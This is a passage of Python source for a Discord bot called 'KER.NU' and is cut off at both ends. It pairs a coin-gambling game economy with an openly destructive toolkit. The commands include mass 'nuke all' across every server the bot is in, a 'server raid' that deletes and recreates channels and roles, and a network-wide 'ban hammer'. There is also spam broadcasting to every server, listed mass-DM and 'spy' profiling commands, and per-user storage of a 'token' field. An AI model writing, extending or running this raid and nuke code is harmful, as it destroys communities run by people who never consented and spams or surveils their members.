    embed.add_field(name="Total Nuked Members", value=total_nuked_members, inline=True)
    embed.add_field(name="Bot Latency", value=f"{round(bot.latency * 1000)}ms", inline=True)
    embed.add_field(name="Uptime", value="Active", inline=True)
    await ctx.reply(embed=embed)

async def premium_dashboard(ctx):
    embed = discord.Embed(title="🌐 KER.NU Ultimate Dashboard", color=0x00ffff)
    embed.add_field(name="Dashboard URL", value="http://localhost:5000", inline=False)
    embed.add_field(name="Features", value="• Server Management\n• User Control\n• Live Statistics\n• Nuke Controls\n• Database Viewer", inline=False)
    embed.add_field(name="Status", value="🟢 Online and Ready", inline=True)
    await ctx.reply(embed=embed)

async def premium_nuke_all(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("❌ You're not ker.nu")

    embed = discord.Embed(title="⚠️ MASS NUKE WARNING", color=0xff0000)
    embed.add_field(name="Target Servers", value=len([g for g in bot.guilds if g.id != your_server]), inline=True)
    embed.add_field(name="⚠️ DANGER", value="This will nuke ALL servers!", inline=False)
    embed.add_field(name="Confirm", value="React with 💀 to confirm", inline=False)

    message = await ctx.reply(embed=embed)
    await message.add_reaction("💀")

    def check(reaction, user):
        return user.id == ctx.author.id and str(reaction.emoji) == "💀"

    try:
        await bot.wait_for('reaction_add', timeout=30.0, check=check)

        nuked_count = 0
        for guild in bot.guilds:
            if guild.id != your_server:
                try:
                    await auto_nuke(guild.id)
                    nuked_count += 1
                    await asyncio.sleep(1)  # Rate limiting
                except:
                    pass

        embed = discord.Embed(title="💀 MASS NUKE COMPLETE", color=0xff0000)
        embed.add_field(name="Servers Nuked", value=nuked_count, inline=True)
        await message.edit(embed=embed)

    except asyncio.TimeoutError:
        embed = discord.Embed(title="❌ Mass Nuke Cancelled", color=0xffff00)
        await message.edit(embed=embed)

async def premium_server_spy(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            return await ctx.reply("❌ Server not found or bot not in server")

        embed = discord.Embed(title=f"🕵️ Server Spy: {guild.name}", color=0x800080)
        embed.add_field(name="Server ID", value=guild.id, inline=True)
        embed.add_field(name="Owner", value=f"{guild.owner.name}#{guild.owner.discriminator}", inline=True)
        embed.add_field(name="Members", value=guild.member_count, inline=True)
        embed.add_field(name="Channels", value=len(guild.channels), inline=True)
        embed.add_field(name="Roles", value=len(guild.roles), inline=True)
        embed.add_field(name="Boost Level", value=guild.premium_tier, inline=True)
        embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"), inline=True)
        embed.add_field(name="Region", value=str(guild.region) if hasattr(guild, 'region') else "N/A", inline=True)

        # Get online members
        online_members = sum(1 for member in guild.members if member.status != discord.Status.offline)
        embed.add_field(name="Online Members", value=online_members, inline=True)

        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Error: {str(e)}")

async def premium_user_spy(ctx, user_id):
    try:
        user = await bot.fetch_user(int(user_id))

        embed = discord.Embed(title=f"🕵️ User Spy: {user.name}", color=0x800080)
        embed.add_field(name="Username", value=f"{user.name}#{user.discriminator}", inline=True)
        embed.add_field(name="User ID", value=user.id, inline=True)
        embed.add_field(name="Bot", value="Yes" if user.bot else "No", inline=True)
        embed.add_field(name="Created", value=user.created_at.strftime("%Y-%m-%d"), inline=True)

        # Check if user is in database
        if str(user.id) in config.get('users', {}):
            user_data = config[str(user.id)]
            embed.add_field(name="Nuked Servers", value=user_data.get('nuked_server', '0'), inline=True)
            embed.add_field(name="Nuked Members", value=user_data.get('nuked_member', '0'), inline=True)
            embed.add_field(name="Coins", value=user_data.get('coins', '0'), inline=True)

        # Count mutual servers
        mutual_servers = sum(1 for guild in bot.guilds if guild.get_member(user.id))
        embed.add_field(name="Mutual Servers", value=mutual_servers, inline=True)

        embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)
        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Error: {str(e)}")

async def premium_broadcast(ctx, message):
    sent = 0
    failed = 0

    for guild in bot.guilds:
        if guild.id == your_server:
            continue

        try:
            # Find a suitable channel
            channel = None
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).send_messages:
                    channel = ch
                    break

            if channel:
                embed = discord.Embed(title="📢 KER.NU Broadcast", description=message, color=0xff0000)
                embed.set_footer(text="Sent by KER.NU Supreme")
                await channel.send(embed=embed)
                sent += 1
            else:
                failed += 1
        except:
            failed += 1

        await asyncio.sleep(0.5)  # Rate limiting

    embed = discord.Embed(title="📢 Broadcast Complete", color=0x00ff00)
    embed.add_field(name="Sent", value=sent, inline=True)
    embed.add_field(name="Failed", value=failed, inline=True)
    await ctx.reply(embed=embed)

async def premium_coin_bomb(ctx, user_id, amount):
    try:
        user_id = int(user_id)
        amount = int(amount)

        if amount > 10000:
            return await ctx.reply("❌ Maximum amount is 10,000 coins")

        new_balance = await economy.update_balance(user_id, amount)

        embed = discord.Embed(title="💰 Coin Bomb Deployed", color=0xffd700)
        embed.add_field(name="Target", value=f"<@{user_id}>", inline=True)
        embed.add_field(name="Amount", value=f"+{amount} coins", inline=True)
        embed.add_field(name="New Balance", value=f"{new_balance} coins", inline=True)
        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Error: {str(e)}")

async def premium_ban_hammer(ctx, user_id):
    try:
        user_id = int(user_id)
        banned_from = []
        failed = []

        for guild in bot.guilds:
            if guild.id == your_server:
                continue

            try:
                member = guild.get_member(user_id)
                if member:
                    await guild.ban(member, reason="KER.NU Ban Hammer")
                    banned_from.append(guild.name)
            except:
                failed.append(guild.name)

        embed = discord.Embed(title="🔨 Ban Hammer Results", color=0xff0000)
        embed.add_field(name="Target", value=f"<@{user_id}>", inline=False)
        embed.add_field(name="Banned From", value=f"{len(banned_from)} servers", inline=True)
        embed.add_field(name="Failed", value=f"{len(failed)} servers", inline=True)

        if banned_from:
            embed.add_field(name="Success List", value="\n".join(banned_from[:10]), inline=False)

        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Error: {str(e)}")

async def premium_server_raid(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            return await ctx.reply("❌ Server not found")

        embed = discord.Embed(title="🔥 Server Raid Initiated", color=0xff0000)
        embed.add_field(name="Target", value=guild.name, inline=True)
        embed.add_field(name="Members", value=guild.member_count, inline=True)
        await ctx.reply(embed=embed)

        # Execute advanced raid
        tasks = []
        tasks.append(delete_channels(guild.id))
        tasks.append(create_channels(guild.id))
        tasks.append(create_roles(ctx))

        await asyncio.gather(*tasks)

        embed = discord.Embed(title="🔥 Server Raid Complete", color=0x00ff00)
        embed.add_field(name="Status", value="✅ Raid Successful", inline=True)
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.reply(f"❌ Error: {str(e)}")

async def premium_database_backup(ctx):
    try:
        import shutil
        import datetime

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"database_backup_{timestamp}.ini"

        shutil.copy2('database.ini', backup_name)

        embed = discord.Embed(title="💾 Database Backup", color=0x00ff00)
        embed.add_field(name="Status", value="✅ Backup Created", inline=True)
        embed.add_field(name="File", value=backup_name, inline=True)
        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Backup failed: {str(e)}")

async def premium_emergency_stop(ctx):
    embed = discord.Embed(title="🚨 EMERGENCY STOP ACTIVATED", color=0xff0000)
    embed.add_field(name="Status", value="🛑 All Operations Halted", inline=True)
    embed.add_field(name="Message", value="Bot entering safe mode...", inline=True)
    await ctx.reply(embed=embed)

    # Stop all tasks and operations
    status_monitor.stop()
    print("EMERGENCY STOP: Bot operations halted by owner")

async def premium_help(ctx):
    embed = discord.Embed(title="⭐ Ultimate Premium Owner Commands", color=0xffd700)
    embed.set_footer(text="KER.NU Premium - Ultimate Edition")

    premium_commands = {
        "webhook": "Send message via webhook to any server. Usage: `webhook <server_id> <message>`",
        "massdm": "Send DM to multiple users. Usage: `massdm <message>`",
        "servers": "List all servers with detailed info and controls.",
        "stats": "Display comprehensive bot statistics.",
        "dashboard": "Start web dashboard on port 5000.",
        "nukeall": "⚠️ DANGER: Mass nuke all servers (except home).",
        "serverspy": "Get detailed server info. Usage: `serverspy <server_id>`",
        "userspy": "Get detailed user info. Usage: `userspy <user_id>`",
        "broadcast": "Send message to all servers. Usage: `broadcast <message>`",
        "coinbomb": "Give coins to user. Usage: `coinbomb <user_id> <amount>`",
        "banhammer": "Ban user from all servers. Usage: `banhammer <user_id>`",
        "serverraid": "Advanced server raid. Usage: `serverraid <server_id>`",
        "backup": "Backup all bot data.",
        "stop": "Emergency stop all bot operations.",
        "help": "Shows this premium help message."
    }

    premium_value = "\n".join([f"`{name}` - {description}" for name, description in premium_commands.items()])

    embed.add_field(name="⭐ Ultimate Premium Commands", value=premium_value, inline=False)
    embed.add_field(name="ℹ️ Premium Prefix", value=f"Use `{PREMIUM_PREFIX}` for all premium commands", inline=False)
    embed.add_field(name="🌟 Example", value=f"`{PREMIUM_PREFIX} servers` or `{PREMIUM_PREFIX} nukeall`", inline=False)
    embed.add_field(name="🌐 Dashboard", value="Access your control panel at: http://localhost:5000", inline=False)

    await ctx.send(embed=embed)

async def nuker_rename(ctx, command_name, new_name):
    # Check if user is the owner from config
    if str(ctx.author.id) not in owners:
        return await ctx.reply("you're not ker.nu")

    if len(new_name) > 20:
        return await ctx.reply("❌ Command name cannot be longer than 20 characters!")

    if new_name in ['rename']:
        return await ctx.reply("❌ Cannot rename to reserved command names!")

    # Check if it's the main logs command
    if command_name == "logs":
        old_name = COMMAND_ALIASES['logs']
        COMMAND_ALIASES['logs'] = new_name

        # Re-register the command with new name
        register_logs_command()

        embed = discord.Embed(title="✅ Log Command Renamed", color=0x00ff00)
        embed.add_field(name="Old Name", value=f"`?{old_name}`", inline=True)
        embed.add_field(name="New Name", value=f"`?{new_name}`", inline=True)
        embed.add_field(name="Example Usage", value=f"`?{new_name} check`", inline=False)
        await ctx.reply(embed=embed)
        return

    # Check if it's a subcommand
    if command_name in COMMAND_ALIASES:
        old_name = COMMAND_ALIASES[command_name]
        COMMAND_ALIASES[command_name] = new_name

        embed = discord.Embed(title="✅ Log Subcommand Renamed", color=0x00ff00)
        embed.add_field(name="Old Name", value=f"`?{COMMAND_ALIASES['logs']} {old_name}`", inline=True)
        embed.add_field(name="New Name", value=f"`?{COMMAND_ALIASES['logs']} {new_name}`", inline=True)
        embed.add_field(name="Example Usage", value=f"`?{COMMAND_ALIASES['logs']} {new_name}`", inline=False)
        await ctx.reply(embed=embed)
    else:
        available_commands = ', '.join([f"`{cmd}`" for cmd in COMMAND_ALIASES.keys()])
        await ctx.reply(f"❌ Command `{command_name}` not found!\nAvailable log commands: {available_commands}")

class economy:
    async def get_balance(user_id):
        user_id = str(user_id)
        
        # Give unlimited coins to owner
        if user_id in owners:
            return 999999999  # Unlimited coins for kernu
            
        if user_id in config['users']:
            return int(config[user_id].get('coins', 100))
        else:
            # Initialize new user with 100 coins
            config['users'][user_id] = None
            config[user_id] = {}
            config[user_id]['coins'] = '100'
            config[user_id]['nuked_server'] = '0'
            config[user_id]['nuked_member'] = '0'
            config[user_id]['biggest_server'] = '0'
            config[user_id]['token'] = 'None'
            config[user_id]["auto_nuke"] = "false"
            with open('database.ini', 'w') as configfile:
                config.write(configfile)
            return 100

    async def update_balance(user_id, amount):
        user_id = str(user_id)
        
        # Owner always has unlimited coins
        if user_id in owners:
            return 999999999
            
        if user_id not in config['users']:
            await economy.get_balance(user_id)

        current_balance = int(config[user_id].get('coins', 100))
        new_balance = max(0, current_balance + amount)
        config[user_id]['coins'] = str(new_balance)

        with open('database.ini', 'w') as configfile:
            config.write(configfile)
        return new_balance

@bot.command(name="balance")
async def balance(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author

    balance = await economy.get_balance(user.id)
    embed = discord.Embed(title=f"{user.name}'s Balance", color=0x00ff00)
    
    if str(user.id) in owners:
        embed.add_field(name="Coins", value="💰 ∞ UNLIMITED (OWNER)", inline=False)
        embed.add_field(name="Status", value="👑 SUPREME MASTER", inline=True)
        embed.color = 0xffd700
    else:
        embed.add_field(name="Coins", value=f"💰 {balance}", inline=False)
    
    await ctx.reply(embed=embed)

@bot.command(name="flip")
async def coinflip(ctx, bet_amount: int = None, choice: str = None):
    if bet_amount is None or choice is None:
        embed = discord.Embed(title="Coinflip", description="Usage: `$kernu flip <amount> <heads/tails>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    if choice.lower() not in ['heads', 'tails', 'h', 't']:
        return await ctx.reply("Please choose either `heads`/`h` or `tails`/`t`")

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    # Normalize choice
    user_choice = 'heads' if choice.lower() in ['heads', 'h'] else 'tails'

    # Create initial animation embed
    embed = discord.Embed(title="🪙 Coinflip Animation", color=0xffff00)
    embed.add_field(name="Your Bet", value=f"💰 {bet_amount} coins on **{user_choice.upper()}**", inline=True)
    embed.add_field(name="Status", value="🔄 Flipping coin...", inline=True)
    embed.add_field(name="Animation", value="🪙", inline=False)
    
    message = await ctx.reply(embed=embed)

    # Coin flip animation sequence
    flip_frames = ["🪙", "🔄", "🌀", "💫", "⭐", "🪙"]
    
    for i, frame in enumerate(flip_frames):
        embed = discord.Embed(title="🪙 Coinflip Animation", color=0xffff00)
        embed.add_field(name="Your Bet", value=f"💰 {bet_amount} coins on **{user_choice.upper()}**", inline=True)
        
        if i < len(flip_frames) - 1:
            embed.add_field(name="Status", value="🔄 Flipping coin...", inline=True)
            embed.add_field(name="Animation", value=f"{frame} **FLIPPING** {frame}", inline=False)
        else:
            embed.add_field(name="Status", value="⏳ Landing...", inline=True)
            embed.add_field(name="Animation", value="🪙 **FINAL FLIP** 🪙", inline=False)
        
        await message.edit(embed=embed)
        await asyncio.sleep(0.8)

    # Determine result
    result = random.choice(['heads', 'tails'])

    # Show final result with dramatic reveal
    await asyncio.sleep(1)

    if user_choice == result:
        # Win - double the bet
        winnings = bet_amount
        new_balance = await economy.update_balance(ctx.author.id, winnings)
        embed = discord.Embed(title="🪙 Coinflip Result", color=0x00ff00)
        embed.add_field(name="🎯 Final Result", value=f"🪙 **{result.upper()}** 🪙", inline=True)
        embed.add_field(name="🎉 Outcome", value="**YOU WON!** 🎊", inline=True)
        embed.add_field(name="💰 Winnings", value=f"**+{winnings} coins**", inline=True)
        embed.add_field(name="💳 New Balance", value=f"💰 **{new_balance} coins**", inline=False)
        embed.set_footer(text="🔥 KER.NU - Lucky flip! 🔥")
    else:
        # Lose - lose the bet
        new_balance = await economy.update_balance(ctx.author.id, -bet_amount)
        embed = discord.Embed(title="🪙 Coinflip Result", color=0xff0000)
        embed.add_field(name="🎯 Final Result", value=f"🪙 **{result.upper()}** 🪙", inline=True)
        embed.add_field(name="😢 Outcome", value="**YOU LOST** 💔", inline=True)
        embed.add_field(name="💸 Lost", value=f"**-{bet_amount} coins**", inline=True)
        embed.add_field(name="💳 New Balance", value=f"💰 **{new_balance} coins**", inline=False)
        embed.set_footer(text="🎲 KER.NU - Better luck next time! 🎲")

    await message.edit(embed=embed)

@bot.command(name="bet")
async def bet(ctx, user: discord.Member = None, amount: int = None):
    if user is None or amount is None:
        embed = discord.Embed(title="Bet", description="Usage: `$kernu bet <@user> <amount>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    if user.id == ctx.author.id:
        return await ctx.reply("You can't bet against yourself!")

    if user.bot:
        return await ctx.reply("You can't bet against bots!")

    challenger_balance = await economy.get_balance(ctx.author.id)
    opponent_balance = await economy.get_balance(user.id)

    if amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if amount > challenger_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {challenger_balance}")

    if amount > opponent_balance:
        return await ctx.reply(f"{user.name} doesn't have enough coins! Their balance: {opponent_balance}")

    # Create bet challenge embed
    embed = discord.Embed(title="🎲 Bet Challenge", color=0xffff00)
    embed.add_field(name="Challenger", value=ctx.author.mention, inline=True)
    embed.add_field(name="Opponent", value=user.mention, inline=True)
    embed.add_field(name="Amount", value=f"💰 {amount} coins", inline=True)
    embed.add_field(name="Instructions", value=f"{user.mention}, react with ✅ to accept or ❌ to decline", inline=False)

    message = await ctx.reply(embed=embed)
    await message.add_reaction("✅")
    await message.add_reaction("❌")

    def check(reaction, reaction_user):
        return reaction_user.id == user.id and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == message.id

    try:
        reaction, reaction_user = await bot.wait_for('reaction_add', timeout=60.0, check=check)

        if str(reaction.emoji) == "❌":
            embed = discord.Embed(title="🎲 Bet Declined", description=f"{user.name} declined the bet.", color=0xff0000)
            return await message.edit(embed=embed)

        # Bet accepted, determine winner
        winner = random.choice([ctx.author, user])
        loser = user if winner == ctx.author else ctx.author

        # Update balances
        await economy.update_balance(winner.id, amount)
        await economy.update_balance(loser.id, -amount)

        winner_balance = await economy.get_balance(winner.id)
        loser_balance = await economy.get_balance(loser.id)

        embed = discord.Embed(title="🎲 Bet Result", color=0x00ff00)
        embed.add_field(name="Winner", value=f"🎉 {winner.mention}", inline=True)
        embed.add_field(name="Loser", value=f"😢 {loser.mention}", inline=True)
        embed.add_field(name="Amount", value=f"💰 {amount} coins", inline=True)
        embed.add_field(name=f"{winner.name}'s Balance", value=f"💰 {winner_balance} coins", inline=True)
        embed.add_field(name=f"{loser.name}'s Balance", value=f"💰 {loser_balance} coins", inline=True)

        await message.edit(embed=embed)

    except asyncio.TimeoutError:
        embed = discord.Embed(title="🎲 Bet Expired", description="The bet challenge timed out.", color=0xff0000)
        await message.edit(embed=embed)

@bot.command(name="daily")
async def daily(ctx):
    user_id = str(ctx.author.id)
    current_time = int(time.time())

    if user_id not in config['users']:
        await economy.get_balance(ctx.author.id)

    last_daily = int(config[user_id].get('last_daily', 0))

    # Check if 24 hours have passed (86400 seconds)
    if current_time - last_daily < 86400:
        time_left = 86400 - (current_time - last_daily)
        hours = time_left // 3600
        minutes = (time_left % 3600) // 60
        return await ctx.reply(f"You already claimed your daily reward! Come back in {hours}h {minutes}m")

    # Give daily reward
    daily_amount = random.randint(50, 150)
    new_balance = await economy.update_balance(ctx.author.id, daily_amount)

    config[user_id]['last_daily'] = str(current_time)
    with open('database.ini', 'w') as configfile:
        config.write(configfile)

    embed = discord.Embed(title="💰 Daily Reward", color=0x00ff00)
    embed.add_field(name="Reward", value=f"💰 +{daily_amount} coins", inline=True)
    embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    await ctx.reply(embed=embed)

@bot.command(name="slots")
async def slots(ctx, bet_amount: int = None):
    if bet_amount is None:
        embed = discord.Embed(title="🎰 Slot Machine", description="Usage: `$kernu slots <amount>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    # Slot symbols with different rarities
    symbols = ["🍒", "🍊", "🍋", "🍇", "⭐", "💎", "7️⃣"]
    weights = [30, 25, 20, 15, 6, 3, 1]  # Rarity weights
    
    # Create initial spinning animation
    embed = discord.Embed(title="🎰 KER.NU SLOT MACHINE 🎰", color=0xffd700)
    embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins**", inline=True)
    embed.add_field(name="🎯 Status", value="🔄 **SPINNING...**", inline=True)
    embed.add_field(name="🎰 Reels", value="🔄 🔄 🔄", inline=False)
    embed.set_footer(text="🎰 KER.NU Casino - Spinning the reels... 🎰")
    
    message = await ctx.reply(embed=embed)

    # Spinning animation frames
    spin_frames = [
        ["🔄", "🔄", "🔄"],
        ["🌀", "🌀", "🌀"],
        ["💫", "💫", "💫"],
        ["⚡", "⚡", "⚡"],
        ["🔥", "🔥", "🔥"],
        ["🎪", "🎪", "🎪"]
    ]
    
    # Show spinning animation
    for i, frame in enumerate(spin_frames):
        embed = discord.Embed(title="🎰 KER.NU SLOT MACHINE 🎰", color=0xffd700)
        embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins**", inline=True)
        embed.add_field(name="🎯 Status", value="🔄 **SPINNING...**", inline=True)
        embed.add_field(name="🎰 Reels", value=f"**{frame[0]} {frame[1]} {frame[2]}**", inline=False)
        embed.add_field(name="⏰ Spin Progress", value="▓" * (i + 1) + "░" * (6 - i - 1), inline=False)
        embed.set_footer(text="🎰 KER.NU Casino - Spinning the reels... 🎰")
        
        await message.edit(embed=embed)
        await asyncio.sleep(0.7)

    # Generate final result
    result = random.choices(symbols, weights=weights, k=3)
    
    # Show reels stopping one by one
    stopping_reels = ["🔄", "🔄", "🔄"]
    
    for i in range(3):
        stopping_reels[i] = result[i]
        embed = discord.Embed(title="🎰 KER.NU SLOT MACHINE 🎰", color=0xffd700)
        embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins**", inline=True)
        embed.add_field(name="🎯 Status", value=f"⏹️ **REEL {i+1} STOPPED**", inline=True)
        embed.add_field(name="🎰 Reels", value=f"**{stopping_reels[0]} {stopping_reels[1]} {stopping_reels[2]}**", inline=False)
        embed.set_footer(text=f"🎰 KER.NU Casino - Reel {i+1}/3 stopped... 🎰")
        
        await message.edit(embed=embed)
        await asyncio.sleep(1.2)

    # Calculate winnings
    multiplier = 0
    if result[0] == result[1] == result[2]:  # Triple match
        if result[0] == "💎":
            multiplier = 50  # Jackpot!
        elif result[0] == "7️⃣":
            multiplier = 25
        elif result[0] == "⭐":
            multiplier = 10
        else:
            multiplier = 5
    elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:  # Double match
        multiplier = 2

    winnings = int(bet_amount * multiplier) - bet_amount
    new_balance = await economy.update_balance(ctx.author.id, winnings)

    # Show dramatic final result
    await asyncio.sleep(1)
    
    embed = discord.Embed(title="🎰 SLOT MACHINE RESULTS 🎰", color=0xffd700)
    embed.add_field(name="🎯 Final Result", value=f"**{result[0]} {result[1]} {result[2]}**", inline=False)
    
    if multiplier > 0:
        if multiplier >= 25:
            embed.add_field(name="💎 MEGA JACKPOT! 💎", value=f"🎉 **+{winnings} coins** 🎉", inline=True)
            embed.color = 0xff0000
            embed.set_footer(text="💎 KER.NU Casino - MEGA JACKPOT WINNER! 💎")
        elif multiplier >= 10:
            embed.add_field(name="⭐ BIG WIN! ⭐", value=f"🎉 **+{winnings} coins** 🎉", inline=True)
            embed.color = 0xffd700
            embed.set_footer(text="⭐ KER.NU Casino - BIG WINNER! ⭐")
        else:
            embed.add_field(name="🎉 WINNER! 🎉", value=f"💰 **+{winnings} coins**", inline=True)
            embed.color = 0x00ff00
            embed.set_footer(text="🎉 KER.NU Casino - Lucky winner! 🎉")
    else:
        embed.add_field(name="😢 No Match", value=f"💸 **-{bet_amount} coins**", inline=True)
        embed.color = 0xff0000
        embed.set_footer(text="🎰 KER.NU Casino - Better luck next time! 🎰")

    embed.add_field(name="💳 New Balance", value=f"💰 **{new_balance} coins**", inline=True)
    await message.edit(embed=embed)

@bot.command(name="blackjack")
async def blackjack(ctx, bet_amount: int = None):
    if bet_amount is None:
        embed = discord.Embed(title="🃏 Blackjack", description="Usage: `$kernu blackjack <amount>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    # Simple blackjack simulation
    def card_value():
        return random.randint(1, 11)

    def hand_total(hand):
        total = sum(hand)
        aces = hand.count(11)
        while total > 21 and aces > 0:
            total -= 10
            aces -= 1
        return total

    # Deal initial cards
    player_hand = [card_value(), card_value()]
    dealer_hand = [card_value(), card_value()]

    player_total = hand_total(player_hand)
    dealer_total = hand_total(dealer_hand)

    # Simple AI logic (no hit/stand interaction for simplicity)
    if player_total < 17 and random.random() > 0.3:
        player_hand.append(card_value())
        player_total = hand_total(player_hand)

    # Dealer hits on 16, stands on 17
    while dealer_total < 17:
        dealer_hand.append(card_value())
        dealer_total = hand_total(dealer_hand)

    # Determine winner
    winnings = 0
    result_text = ""
    
    if player_total > 21:
        result_text = "💥 Bust! You lose!"
        winnings = -bet_amount
    elif dealer_total > 21:
        result_text = "🎉 Dealer busts! You win!"
        winnings = bet_amount
    elif player_total == 21:
        result_text = "🎯 Blackjack! You win big!"
        winnings = int(bet_amount * 1.5)
    elif player_total > dealer_total:
        result_text = "🎉 You win!"
        winnings = bet_amount
    elif player_total < dealer_total:
        result_text = "😢 Dealer wins!"
        winnings = -bet_amount
    else:
        result_text = "🤝 Push! It's a tie!"
        winnings = 0

    new_balance = await economy.update_balance(ctx.author.id, winnings)

    embed = discord.Embed(title="🃏 Blackjack Results", color=0x00ff00 if winnings >= 0 else 0xff0000)
    embed.add_field(name="Your Hand", value=f"{player_total}", inline=True)
    embed.add_field(name="Dealer Hand", value=f"{dealer_total}", inline=True)
    embed.add_field(name="Result", value=result_text, inline=False)
    
    if winnings > 0:
        embed.add_field(name="Winnings", value=f"💰 +{winnings} coins", inline=True)
    elif winnings < 0:
        embed.add_field(name="Lost", value=f"💸 {abs(winnings)} coins", inline=True)
    
    embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    await ctx.reply(embed=embed)

@bot.command(name="roulette")
async def roulette(ctx, bet_amount: int = None, bet_type: str = None, number: int = None):
    if bet_amount is None or bet_type is None:
        embed = discord.Embed(title="🎡 Roulette", description="Usage: `$kernu roulette <amount> <red/black/even/odd/number> [number]`", color=0xff0000)
        embed.add_field(name="Bet Types", value="• `red` or `black` (2x payout)\n• `even` or `odd` (2x payout)\n• `number` + specific number 0-36 (35x payout)", inline=False)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    # Create initial spinning animation
    bet_display = f"{bet_type.upper()}"
    if bet_type.lower() == "number" and number is not None:
        bet_display = f"NUMBER {number}"
    
    embed = discord.Embed(title="🎡 KER.NU ROULETTE WHEEL 🎡", color=0xff0000)
    embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins on {bet_display}**", inline=True)
    embed.add_field(name="🎯 Status", value="🔄 **SPINNING WHEEL...**", inline=True)
    embed.add_field(name="🎡 Wheel", value="🔄 **SPINNING** 🔄", inline=False)
    embed.set_footer(text="🎡 KER.NU Casino - Spinning the roulette wheel... 🎡")
    
    message = await ctx.reply(embed=embed)

    # Wheel spinning animation
    spin_frames = [
        "🔄 **SPINNING** 🔄",
        "🌀 **SPINNING FAST** 🌀", 
        "💫 **MAXIMUM SPEED** 💫",
        "⚡ **LIGHTNING SPIN** ⚡",
        "🌪️ **TORNADO SPIN** 🌪️",
        "🎪 **CIRCUS SPIN** 🎪"
    ]
    
    # Show spinning animation
    for i, frame in enumerate(spin_frames):
        embed = discord.Embed(title="🎡 KER.NU ROULETTE WHEEL 🎡", color=0xff0000)
        embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins on {bet_display}**", inline=True)
        embed.add_field(name="🎯 Status", value="🔄 **SPINNING WHEEL...**", inline=True)
        embed.add_field(name="🎡 Wheel", value=frame, inline=False)
        embed.add_field(name="⏰ Spin Speed", value="🔥" * (i + 1) + "⚪" * (6 - i - 1), inline=False)
        embed.set_footer(text="🎡 KER.NU Casino - Spinning the roulette wheel... 🎡")
        
        await message.edit(embed=embed)
        await asyncio.sleep(0.8)

    # Show ball bouncing
    bounce_frames = ["🟡", "⚪", "🔴", "⚫", "🟢"]
    for i, ball in enumerate(bounce_frames):
        embed = discord.Embed(title="🎡 KER.NU ROULETTE WHEEL 🎡", color=0xff0000)
        embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins on {bet_display}**", inline=True)
        embed.add_field(name="🎯 Status", value="⏳ **BALL BOUNCING...**", inline=True)
        embed.add_field(name="🎡 Wheel", value=f"⚪ **SLOWING DOWN** ⚪", inline=False)
        embed.add_field(name="🏀 Ball", value=f"**{ball} BOUNCING {ball}**", inline=False)
        embed.set_footer(text="🎡 KER.NU Casino - Ball is bouncing... 🎡")
        
        await message.edit(embed=embed)
        await asyncio.sleep(1.0)

    # Generate final result
    winning_number = random.randint(0, 36)
    red_numbers = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36]
    
    # Determine winning color and emoji
    if winning_number == 0:
        winning_color = "green"
        color_emoji = "💚"
        embed_color = 0x00ff00
    elif winning_number in red_numbers:
        winning_color = "red"
        color_emoji = "🔴"
        embed_color = 0xff0000
    else:
        winning_color = "black"
        color_emoji = "⚫"
        embed_color = 0x2f3136

    # Show final landing
    embed = discord.Embed(title="🎡 KER.NU ROULETTE WHEEL 🎡", color=embed_color)
    embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins on {bet_display}**", inline=True)
    embed.add_field(name="🎯 Status", value="🎯 **BALL LANDED!**", inline=True)
    embed.add_field(name="🎡 Final Result", value=f"**{color_emoji} {winning_number} {color_emoji}**", inline=False)
    embed.set_footer(text="🎡 KER.NU Casino - Final result! 🎡")
    
    await message.edit(embed=embed)
    await asyncio.sleep(2)

    # Calculate winnings
    winnings = 0
    result_text = f"🎡 **{winning_number}** (**{winning_color.upper()}**)"

    if bet_type.lower() == "number" and number is not None:
        if number == winning_number:
            winnings = bet_amount * 35
            result_text += f"\n💎 **DIRECT HIT! MEGA WIN!**"
            result_color = 0xffd700
        else:
            winnings = -bet_amount
